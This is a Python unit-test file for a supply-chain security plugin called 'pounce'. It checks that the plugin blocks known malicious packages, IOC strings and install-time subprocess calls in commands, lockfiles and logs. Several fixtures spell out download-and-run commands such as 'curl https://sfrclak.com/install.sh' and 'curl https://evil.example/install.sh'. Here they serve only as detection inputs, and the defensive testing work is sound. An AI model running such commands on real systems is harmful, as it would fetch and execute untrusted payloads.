import json
import os
import sys
import tempfile
import unittest
from datetime import UTC, datetime
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
PLUGIN_ROOT = REPO_ROOT / "plugins" / "pounce"
SCRIPTS_ROOT = PLUGIN_ROOT / "scripts"
if str(SCRIPTS_ROOT) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_ROOT))

import pounce_intel  # noqa: E402
from pounce_runtime import (  # noqa: E402
    VerificationUnavailable,
    assess_dependency_command,
    assess_dependency_guard,
    agents_block_text,
    build_dashboard_snapshot,
    check_npm_release,
    ensure_workspace_config_toml,
    evaluate_verdict,
    extract_dependency_commands,
    match_package_iocs,
    record_dependency_guard_allowlist,
    render_dashboard_markdown,
    render_workspace_hooks,
    replace_managed_block,
    snapshot_dependency_guard,
    vet_payload,
)


class PounceRuntimeTests(unittest.TestCase):
    def test_exact_ioc_match_blocks(self) -> None:
        result = vet_payload(
            {
                "mode": "release",
                "ecosystem": "npm",
                "package_name": "plain-crypto-js",
                "version": "4.2.1",
            },
            PLUGIN_ROOT,
        )
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any(item["signal_name"] == "exact_ioc_match" for item in result["findings"]))

    def test_artifact_ioc_match_blocks(self) -> None:
        result = vet_payload(
            {
                "mode": "release",
                "artifacts": ["curl https://sfrclak.com/install.sh"],
            },
            PLUGIN_ROOT,
        )
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any(item["signal_name"] == "artifact_ioc_match" for item in result["findings"]))

    def test_install_time_mechanism_blocks(self) -> None:
        result = vet_payload(
            {
                "mode": "release",
                "artifacts": ["subprocess.Popen(['python', 'payload.py'])"],
            },
            PLUGIN_ROOT,
        )
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any(item["category"] == "mechanism" for item in result["findings"]))

    def test_managed_block_replace_is_idempotent(self) -> None:
        existing = "# Workspace Policy\n\nUser-owned guidance.\n"
        first = replace_managed_block(existing, agents_block_text())
        second = replace_managed_block(first, agents_block_text())
        self.assertEqual(first, second)
        self.assertIn("User-owned guidance.", second)
        self.assertEqual(second.count("BEGIN POUNCE MANAGED BLOCK"), 1)

    def test_dependency_command_parser_handles_exact_specs(self) -> None:
        result = extract_dependency_commands("npm install axios@1.14.1 @scope/demo@2.0.0")
        self.assertEqual(len(result), 2)
        self.assertEqual(result[0].name, "axios")
        self.assertEqual(result[0].version, "1.14.1")
        self.assertEqual(result[1].name, "@scope/demo")
        self.assertEqual(result[1].version, "2.0.0")

    def test_dependency_command_parser_handles_chained_and_multiline_commands(self) -> None:
        command = (
            "echo warmup && npm i axios@^1.14.0 @scope/demo@2.0.0\n"
            "pnpm up react@18.x ; yarn up lodash@~4.17.0 && bun add zod@3.22.4 && "
            "pip3 install requests[socks]>=2.31.0 && uv pip install rich==13.7.1 && "
            "uv add httpx && poetry add click==8.1.7"
        )
        result = extract_dependency_commands(command)
        self.assertEqual(
            [(item.manager, item.verb, item.name, item.spec_kind) for item in result],
            [
                ("npm", "i", "axios", "range"),
                ("npm", "i", "@scope/demo", "exact"),
                ("pnpm", "up", "react", "range"),
                ("yarn", "up", "lodash", "range"),
                ("bun", "add", "zod", "exact"),
                ("pip3", "install", "requests[socks]", "range"),
                ("uv", "install", "rich", "exact"),
                ("uv", "add", "httpx", "unpinned"),
                ("poetry", "add", "click", "exact"),
            ],
        )
        self.assertEqual(extract_dependency_commands("echo 'npm install demo'"), [])

    def test_non_exact_npm_install_returns_rewrite_with_baseline(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {}, "dependencies": {}},
                "1.2.0": {"dist": {}, "dependencies": {}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "1.2.0": "2026-02-01T00:00:00Z",
            },
            "dist-tags": {"latest": "1.2.0"},
        }
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "package-lock.json").write_text(
                json.dumps(
                    {
                        "name": "fixture",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "fixture", "version": "1.0.0"},
                            "node_modules/demo": {"version": "1.0.0"},
                        },
                    }
                ),
                encoding="utf-8",
            )
            with (
                mock.patch("pounce_runtime.collect_iocs", return_value=[]),
                mock.patch("pounce_runtime.load_npm_package_index", return_value=package_index),
                mock.patch("pounce_runtime.check_npm_release", return_value=[]),
            ):
                assessment = assess_dependency_command("npm i demo@^1.0.0", PLUGIN_ROOT, workspace)
        self.assertTrue(assessment["matched"])
        self.assertTrue(assessment["block"])
        self.assertEqual(assessment["recommended_command"], "npm i demo@1.2.0 --save-exact")
        self.assertEqual(assessment["next_action"], "rewrite_command")
        self.assertEqual(assessment["results"][0]["recommended_version"], "1.2.0")
        self.assertEqual(assessment["results"][0]["baseline_version"], "1.0.0")
        self.assertEqual(assessment["results"][0]["baseline_source"], "workspace_lockfile")

    def test_non_exact_pypi_install_returns_rewrite_with_workspace_baseline(self) -> None:
        package_index = {
            "releases": {
                "1.0.0": [{"upload_time_iso_8601": "2026-01-01T00:00:00Z"}],
                "1.5.0": [{"upload_time_iso_8601": "2026-02-01T00:00:00Z"}],
            }
        }
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "requirements.txt").write_text("demo==1.0.0\n", encoding="utf-8")
            with (
                mock.patch("pounce_runtime.collect_iocs", return_value=[]),
                mock.patch("pounce_runtime.load_pypi_package_index", return_value=package_index),
                mock.patch("pounce_runtime.check_pypi_release", return_value=[]),
            ):
                assessment = assess_dependency_command("pip3 install demo", PLUGIN_ROOT, workspace)
        self.assertTrue(assessment["matched"])
        self.assertTrue(assessment["block"])
        self.assertEqual(assessment["recommended_command"], "pip3 install demo==1.5.0")
        self.assertEqual(assessment["results"][0]["recommended_version"], "1.5.0")
        self.assertEqual(assessment["results"][0]["baseline_version"], "1.0.0")
        self.assertEqual(assessment["results"][0]["baseline_source"], "workspace_manifest")

    def test_snapshot_dependency_guard_creates_turn_state(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "package.json").write_text(
                json.dumps({"dependencies": {"demo": "1.0.0"}}),
                encoding="utf-8",
            )
            state_path = Path(snapshot_dependency_guard(workspace, "turn-1"))
            payload = json.loads(state_path.read_text(encoding="utf-8"))
            self.assertTrue(state_path.exists())
            self.assertIn("package.json", payload["snapshot"]["files"])

    def test_allowlist_recording_uses_vetted_install_mutations(self) -> None:
        package_index = {
            "versions": {"1.2.0": {"dist": {}, "dependencies": {}}},
            "time": {"1.2.0": "2026-02-01T00:00:00Z"},
        }
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "package.json").write_text(json.dumps({"dependencies": {}}), encoding="utf-8")
            snapshot_dependency_guard(workspace, "turn-1")
            with (
                mock.patch("pounce_runtime.collect_iocs", return_value=[]),
                mock.patch("pounce_runtime.load_npm_package_index", return_value=package_index),
                mock.patch("pounce_runtime.check_npm_release", return_value=[]),
            ):
                assessment = assess_dependency_command("npm install demo@1.2.0", PLUGIN_ROOT, workspace)
            state_path = Path(record_dependency_guard_allowlist(workspace, "turn-1", assessment["expected_mutations"]))
            payload = json.loads(state_path.read_text(encoding="utf-8"))
        self.assertFalse(assessment["block"])
        self.assertEqual(len(payload["allowlist"]), 1)
        self.assertEqual(payload["allowlist"][0]["name"], "demo")
        self.assertEqual(payload["allowlist"][0]["expected_version"], "1.2.0")

    def test_guard_blocks_direct_unvetted_dependency_edits(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "package.json").write_text(
                json.dumps({"dependencies": {"demo": "1.0.0"}}),
                encoding="utf-8",
            )
            snapshot_dependency_guard(workspace, "turn-1")
            (workspace / "package.json").write_text(
                json.dumps({"dependencies": {"demo": "1.0.0", "leftpad": "^1.3.0"}}),
                encoding="utf-8",
            )
            assessment = assess_dependency_guard(workspace, "turn-1")
        self.assertTrue(assessment["block"])
        self.assertIn("leftpad", assessment["message"])

    def test_guard_allows_vetted_same_turn_install_changes(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "package.json").write_text(
                json.dumps({"dependencies": {"demo": "1.0.0"}}),
                encoding="utf-8",
            )
            (workspace / "package-lock.json").write_text(json.dumps({"packages": {}}), encoding="utf-8")
            snapshot_dependency_guard(workspace, "turn-1")
            record_dependency_guard_allowlist(
                workspace,
                "turn-1",
                [
                    {
                        "ecosystem": "npm",
                        "manager": "npm",
                        "verb": "install",
                        "name": "demo",
                        "expected_version": "1.2.0",
                        "command": "npm install demo@1.2.0 --save-exact",
                    }
                ],
            )
            (workspace / "package.json").write_text(
                json.dumps({"dependencies": {"demo": "1.2.0"}}),
                encoding="utf-8",
            )
            (workspace / "package-lock.json").write_text(json.dumps({"packages": {"node_modules/demo": {"version": "1.2.0"}}}), encoding="utf-8")
            assessment = assess_dependency_guard(workspace, "turn-1")
        self.assertFalse(assessment["block"])

    def test_guard_ignores_non_semantic_requirement_edits(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "requirements.txt").write_text(
                "demo==1.0.0\n# keep pinned\n",
                encoding="utf-8",
            )
            snapshot_dependency_guard(workspace, "turn-1")
            (workspace / "requirements.txt").write_text(
                "\n demo==1.0.0  # still pinned\n",
                encoding="utf-8",
            )
            assessment = assess_dependency_guard(workspace, "turn-1")
        self.assertFalse(assessment["block"])

    def test_npm_provenance_regression_warns_only_when_baseline_had_attestations(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {"attestations": {"url": "https://example.test/attest"}}},
                "1.1.0": {"dist": {}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "1.1.0": "2026-01-10T00:00:00Z",
            },
        }
        with mock.patch("pounce_runtime.fetch_json", return_value=package_index):
            findings = check_npm_release("demo", "1.1.0")
        signal_names = {finding["signal_name"] for finding in findings}
        self.assertIn("npm_provenance_regression", signal_names)
        self.assertIn("npm_missing_provenance", signal_names)
        self.assertEqual(evaluate_verdict(findings), "warn")

    def test_npm_missing_attestations_without_regression_warns_only(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {}},
                "1.1.0": {"dist": {}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "1.1.0": "2026-01-10T00:00:00Z",
            },
        }
        with mock.patch("pounce_runtime.fetch_json", return_value=package_index):
            findings = check_npm_release("demo", "1.1.0")
        signal_names = {finding["signal_name"] for finding in findings}
        self.assertNotIn("npm_provenance_regression", signal_names)
        self.assertIn("npm_missing_provenance", signal_names)
        self.assertEqual(evaluate_verdict(findings), "warn")

    def test_warn_action_package_match_does_not_block(self) -> None:
        findings = match_package_iocs(
            [
                {
                    "id": "warn-demo",
                    "kind": "vulnerability",
                    "match": {
                        "type": "package_exact",
                        "ecosystem": "npm",
                        "name": "demo",
                        "version": "1.2.3",
                    },
                    "action": "warn",
                    "confidence": 0.8,
                    "reason": "Warning-only package intelligence.",
                    "source": "osv",
                    "source_refs": [{"kind": "osv", "id": "GHSA-demo"}],
                    "published_at": "2026-04-10T00:00:00Z",
                    "modified_at": "2026-04-10T00:00:00Z",
                    "first_seen": "2026-04-10T00:00:00Z",
                    "last_seen": "2026-04-10T00:00:00Z",
                }
            ],
            ecosystem="npm",
            package_name="demo",
            version="1.2.3",
        )
        self.assertEqual(findings[0]["verdict_impact"], "warn")
        self.assertEqual(evaluate_verdict(findings), "warn")

    def test_on_demand_osv_malware_blocks_release_vetting(self) -> None:
        malicious_item = {
            "id": "MAL-2026-1:npm:demo:package_exact:1.2.3",
            "kind": "malicious_package",
            "match": {"type": "package_exact", "ecosystem": "npm", "name": "demo", "version": "1.2.3"},
            "action": "block",
            "confidence": 1.0,
            "reason": "Known malicious package.",
            "source": "osv",
            "source_refs": [{"kind": "osv", "id": "MAL-2026-1"}],
            "published_at": "2026-04-10T00:00:00Z",
            "modified_at": "2026-04-10T00:00:00Z",
            "first_seen": "2026-04-10T00:00:00Z",
            "last_seen": "2026-04-10T00:00:00Z",
            "metadata": {"indicators": [{"match_type": "url", "value": "https://evil.example/install.sh"}]},
        }
        package_index = {
            "versions": {"1.2.3": {"dist": {"attestations": {"url": "https://example.test/attest"}}, "dependencies": {}}},
            "time": {"1.2.3": "2026-04-10T00:00:00Z"},
        }
        with (
            mock.patch("pounce_runtime.collect_iocs", return_value=[]),
            mock.patch("pounce_runtime.pounce_intel.on_demand_osv_items", return_value=[malicious_item]),
            mock.patch("pounce_runtime.check_npm_release", return_value=[]),
            mock.patch("pounce_runtime.load_npm_package_index", return_value=package_index),
        ):
            result = vet_payload(
                {
                    "mode": "release",
                    "ecosystem": "npm",
                    "package_name": "demo",
                    "version": "1.2.3",
                },
                PLUGIN_ROOT,
            )
        self.assertEqual(result["verdict"], "block")
        matched = next(item for item in result["findings"] if item["signal_name"] == "exact_ioc_match")
        self.assertIn("https://evil.example/install.sh", matched["evidence"])

    def test_workspace_baseline_version_beats_registry_previous_release(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {}, "dependencies": {}},
                "1.5.0": {"dist": {}, "dependencies": {}},
                "2.0.0": {"dist": {}, "dependencies": {"newdep": "^1.0.0"}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "1.5.0": "2026-02-01T00:00:00Z",
                "2.0.0": "2026-03-01T00:00:00Z",
            },
        }
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "package-lock.json").write_text(
                json.dumps(
                    {
                        "name": "fixture",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "fixture", "version": "1.0.0"},
                            "node_modules/demo": {"version": "1.0.0"},
                        },
                    }
                ),
                encoding="utf-8",
            )
            with (
                mock.patch("pounce_runtime.fetch_json", return_value=package_index),
                mock.patch(
                    "pounce_runtime.collect_npm_dependency_graph",
                    side_effect=[(set(), set()), (set(), set())],
                ),
            ):
                findings = check_npm_release("demo", "2.0.0", workspace)
        churn_finding = next(finding for finding in findings if finding["signal_name"] == "workspace_dependency_churn")
        self.assertIn("baseline 1.0.0 from workspace_lockfile", churn_finding["evidence"])

    def test_transitive_analysis_unavailable_warns_explicitly(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {}, "dependencies": {}},
                "2.0.0": {"dist": {}, "dependencies": {}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "2.0.0": "2026-03-01T00:00:00Z",
            },
        }
        with mock.patch("pounce_runtime.fetch_json", return_value=package_index), mock.patch(
            "pounce_runtime.collect_npm_dependency_graph",
            side_effect=VerificationUnavailable("npm CLI was not available for transitive dependency analysis."),
        ):
            findings = check_npm_release("demo", "2.0.0")
        self.assertTrue(any(finding["signal_name"] == "transitive_analysis_unavailable" for finding in findings))

    def test_sweep_scans_log_files_for_ioc_strings(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "incident.log").write_text(
                "curl https://sfrclak.com/install.sh\n",
                encoding="utf-8",
            )
            result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any("incident.log" in finding["evidence"] for finding in result["findings"]))

    def test_sweep_blocks_malicious_package_from_poetry_lock(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "poetry.lock").write_text(
                "[[package]]\nname = \"litellm\"\nversion = \"1.82.7\"\n",
                encoding="utf-8",
            )
            result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "block")
        finding = next(item for item in result["findings"] if item["signal_name"] == "exact_ioc_match")
        self.assertIn("poetry.lock", finding["evidence"])

    def test_sweep_blocks_malicious_package_from_pipfile_lock(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "Pipfile.lock").write_text(
                json.dumps({"default": {"litellm": {"version": "==1.82.8"}}, "develop": {}}),
                encoding="utf-8",
            )
            result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "block")
        finding = next(item for item in result["findings"] if item["signal_name"] == "exact_ioc_match")
        self.assertIn("Pipfile.lock", finding["evidence"])

    def test_sweep_blocks_malicious_package_from_uv_lock(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "uv.lock").write_text(
                "[[package]]\nname = \"litellm\"\nversion = \"1.82.7\"\n",
                encoding="utf-8",
            )
            result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "block")
        finding = next(item for item in result["findings"] if item["signal_name"] == "exact_ioc_match")
        self.assertIn("uv.lock", finding["evidence"])

    def test_sweep_does_not_block_generic_python_subprocess_usage(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "cli.py").write_text(
                "import subprocess\nsubprocess.Popen(['echo', 'hello'])\n",
                encoding="utf-8",
            )
            result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "allow")
        self.assertFalse(any(finding["signal_name"] == "mechanism_subprocess_popen" for finding in result["findings"]))
        self.assertFalse(any(finding["signal_name"] == "artifact_ioc_match" for finding in result["findings"]))

    def test_sweep_blocks_setup_py_subprocess_usage(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "setup.py").write_text(
                "import subprocess\nsubprocess.Popen(['echo', 'hello'])\n",
                encoding="utf-8",
            )
            result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any(finding["signal_name"] == "mechanism_subprocess_popen" for finding in result["findings"]))

    def test_sweep_truncation_warns(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "one.txt").write_text("safe\n", encoding="utf-8")
            (workspace / "two.txt").write_text("safe\n", encoding="utf-8")
            with mock.patch("pounce_runtime.MAX_SCAN_FILE_COUNT", 1):
                result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "warn")
        self.assertTrue(any(finding["signal_name"] == "sweep_truncated" for finding in result["findings"]))

    def test_dashboard_marks_fully_configured_workspace_as_protected(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "AGENTS.md").write_text(agents_block_text(), encoding="utf-8")
            (workspace / "package.json").write_text(json.dumps({"dependencies": {"demo": "1.0.0"}}), encoding="utf-8")
            snapshot_dependency_guard(workspace, "turn-1")
            hooks_path = workspace / ".codex" / "hooks.json"
            config_path = workspace / ".codex" / "config.toml"
            hooks_path.parent.mkdir(parents=True, exist_ok=True)
            rendered_hooks = render_workspace_hooks(PLUGIN_ROOT)
            hooks_path.write_text(json.dumps(rendered_hooks, indent=2) + "\n", encoding="utf-8")
            ensure_workspace_config_toml(config_path)
            (workspace / ".pounce" / "stamps").mkdir(parents=True, exist_ok=True)
            (workspace / ".pounce" / "stamps" / "sweep-demo.json").write_text(
                json.dumps(
                    {
                        "mode": "sweep",
                        "request": {"mode": "sweep", "workspace": str(workspace)},
                        "verdict": "allow",
                        "summary": "ALLOW: workspace sweep was clean.",
                        "checked_at": "2026-04-18T10:00:00Z",
                    }
                )
                + "\n",
                encoding="utf-8",
            )

            snapshot = build_dashboard_snapshot({"workspace": str(workspace)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)

        self.assertEqual(snapshot["workspace"]["protection_status"], "protected")
        self.assertTrue(snapshot["workspace"]["managed_policy"])
        self.assertTrue(snapshot["workspace"]["hooks_configured"]["all_events"])
        self.assertTrue(snapshot["workspace"]["hooks_enabled"])
        self.assertEqual(snapshot["workspace"]["dependency_file_count"], 1)
        self.assertIsNotNone(snapshot["workspace"]["latest_guard_snapshot"])
        self.assertEqual(snapshot["workspace"]["last_sweep"]["mode"], "sweep")

    def test_dashboard_marks_incomplete_workspace_as_partial(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "AGENTS.md").write_text(agents_block_text(), encoding="utf-8")
            (workspace / "package.json").write_text(json.dumps({"dependencies": {"demo": "1.0.0"}}), encoding="utf-8")

            snapshot = build_dashboard_snapshot({"workspace": str(workspace)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)

        self.assertEqual(snapshot["workspace"]["protection_status"], "partial")
        self.assertTrue(snapshot["workspace"]["managed_policy"])
        self.assertFalse(snapshot["workspace"]["hooks_configured"]["all_events"])
        self.assertFalse(snapshot["workspace"]["hooks_enabled"])

    def test_dashboard_uses_unavailable_workspace_state_when_no_workspace_can_be_resolved(self) -> None:
        with tempfile.TemporaryDirectory() as state_dir, mock.patch.dict(
            os.environ,
            {"POUNCE_STATE_DIR": state_dir},
            clear=False,
        ):
            snapshot = build_dashboard_snapshot({}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)
            markdown = render_dashboard_markdown(snapshot)

        self.assertFalse(snapshot["workspace"]["available"])
        self.assertEqual(snapshot["workspace"]["protection_status"], "unavailable")
        self.assertEqual(snapshot["recent_verdicts"], [])
        self.assertEqual(snapshot["feed"]["selected_from"], "seed")
        self.assertIn("No workspace was resolved", markdown)
        self.assertIn("No recent verdicts", markdown)

    def test_dashboard_feed_snapshot_reflects_remote_remote_cache_local_and_seed(self) -> None:
        local_feed = {
            "schema_version": "1.0",
            "generated_at": "2026-04-10T00:00:00Z",
            "sources": [{"name": "osv", "status": "ok", "item_count": 1}],
            "items": [
                self._feed_item(
                    "local-1",
                    {"type": "package_exact", "ecosystem": "npm", "name": "local-demo", "version": "1.0.0"},
                )
            ],
        }
        remote_cache_feed = {
            "schema_version": "1.0",
            "generated_at": "2026-04-11T00:00:00Z",
            "sources": [{"name": "remote-cache", "status": "ok", "item_count": 1}],
            "items": [
                self._feed_item(
                    "remote-cache-1",
                    {"type": "package_exact", "ecosystem": "npm", "name": "remote-cache-demo", "version": "1.0.0"},
                )
            ],
        }
        remote_live_feed = {
            "schema_version": "1.0",
            "generated_at": "2026-04-01T00:00:00Z",
            "sources": [{"name": "remote-live", "status": "ok", "item_count": 1}],
            "items": [
                self._feed_item(
                    "remote-live-1",
                    {"type": "package_exact", "ecosystem": "npm", "name": "remote-live-demo", "version": "1.0.0"},
                )
            ],
        }
        fixed_now = datetime(2026, 4, 18, 12, 0, 0, tzinfo=UTC)
        with tempfile.TemporaryDirectory() as state_dir, mock.patch.dict(
            os.environ,
            {
                "POUNCE_STATE_DIR": state_dir,
                "POUNCE_IOC_FEED_URL": "https://feed.example/intel.json",
                "POUNCE_FEED_STALE_AFTER_HOURS": "6",
            },
            clear=False,
        ), mock.patch("pounce_runtime.pounce_intel.now_utc", return_value=fixed_now), mock.patch(
            "pounce_intel.now_utc",
            return_value=fixed_now,
        ):
            pounce_intel.persist_feed_cache(local_feed, fetched_at="2026-04-10T01:00:00Z", fetched_from="local_sync")
            pounce_intel.persist_feed_cache(
                remote_cache_feed,
                fetched_at="2026-04-11T01:00:00Z",
                fetched_from="https://feed.example/intel.json",
                path=pounce_intel.remote_feed_cache_path(),
            )

            with mock.patch("pounce_runtime.pounce_intel.load_remote_feed", return_value=remote_live_feed):
                remote_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)

            pounce_intel.persist_feed_cache(
                remote_cache_feed,
                fetched_at="2026-04-11T01:00:00Z",
                fetched_from="https://feed.example/intel.json",
                path=pounce_intel.remote_feed_cache_path(),
            )
            with mock.patch(
                "pounce_runtime.pounce_intel.load_remote_feed",
                side_effect=pounce_intel.IntelUnavailable("timeout"),
            ):
                remote_cache_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)

            pounce_intel.remote_feed_cache_path().unlink()
            with mock.patch(
                "pounce_runtime.pounce_intel.load_remote_feed",
                side_effect=pounce_intel.IntelUnavailable("timeout"),
            ):
                local_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)

            pounce_intel.feed_cache_path().unlink()
            with mock.patch(
                "pounce_runtime.pounce_intel.load_remote_feed",
                side_effect=pounce_intel.IntelUnavailable("timeout"),
            ):
                seed_snapshot = build_dashboard_snapshot({"workspace": str(PLUGIN_ROOT)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)

        self.assertEqual(remote_snapshot["feed"]["selected_from"], "remote")
        self.assertTrue(any(item["code"] == "feed_stale" for item in remote_snapshot["feed"]["warnings"]))
        self.assertEqual(remote_cache_snapshot["feed"]["selected_from"], "remote_cache")
        self.assertTrue(any(item["code"] == "feed_refresh_failed" for item in remote_cache_snapshot["feed"]["warnings"]))
        self.assertEqual(local_snapshot["feed"]["selected_from"], "local_sync_cache")
        self.assertTrue(any(item["code"] == "feed_refresh_failed" for item in local_snapshot["feed"]["warnings"]))
        self.assertEqual(seed_snapshot["feed"]["selected_from"], "seed")

    def test_dashboard_recent_verdicts_use_checked_at_sort_subjects_and_limit(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            stamp_dir = workspace / ".pounce" / "stamps"
            stamp_dir.mkdir(parents=True, exist_ok=True)
            for index in range(6):
                stamp_dir.joinpath(f"release-{index}.json").write_text(
                    json.dumps(
                        {
                            "mode": "release",
                            "request": {
                                "mode": "release",
                                "ecosystem": "npm",
                                "package_name": f"demo-{index}",
                                "version": f"1.0.{index}",
                            },
                            "verdict": "allow",
                            "summary": f"ALLOW: demo-{index} was clear.",
                            "checked_at": f"2026-04-18T10:0{index}:00Z",
                        }
                    )
                    + "\n",
                    encoding="utf-8",
                )
            stamp_dir.joinpath("artifact.json").write_text(
                json.dumps(
                    {
                        "mode": "release",
                        "request": {"mode": "release", "artifacts": ["curl https://evil.example/install.sh"]},
                        "verdict": "block",
                        "summary": "BLOCK: artifact matched a known IOC.",
                        "checked_at": "2026-04-18T10:09:00Z",
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            stamp_dir.joinpath("sweep.json").write_text(
                json.dumps(
                    {
                        "mode": "sweep",
                        "request": {"mode": "sweep", "workspace": str(workspace)},
                        "verdict": "warn",
                        "summary": "WARN: workspace sweep needs review.",
                        "checked_at": "2026-04-18T10:10:00Z",
                    }
                )
                + "\n",
                encoding="utf-8",
            )

            snapshot = build_dashboard_snapshot({"workspace": str(workspace)}, PLUGIN_ROOT, current_workspace=PLUGIN_ROOT)

        self.assertEqual(len(snapshot["recent_verdicts"]), 5)
        self.assertEqual(snapshot["recent_verdicts"][0]["subject"], "workspace sweep")
        self.assertEqual(snapshot["recent_verdicts"][1]["subject"], "curl https://evil.example/install.sh")
        self.assertEqual(snapshot["recent_verdicts"][2]["subject"], "demo-5@1.0.5")

    @staticmethod
    def _feed_item(item_id: str, match: dict[str, str]) -> dict[str, object]:
        return {
            "id": item_id,
            "kind": "malicious_package" if match["type"].startswith("package") else "ioc_string",
            "match": match,
            "action": "block",
            "confidence": 1.0,
            "reason": "Known bad package.",
            "source": "seed_ioc",
            "source_refs": [{"kind": "seed_ioc", "id": item_id}],
            "published_at": "2026-04-10T00:00:00Z",
            "modified_at": "2026-04-10T00:00:00Z",
            "first_seen": "2026-04-10T00:00:00Z",
            "last_seen": "2026-04-10T00:00:00Z",
        }


if __name__ == "__main__":
    unittest.main()
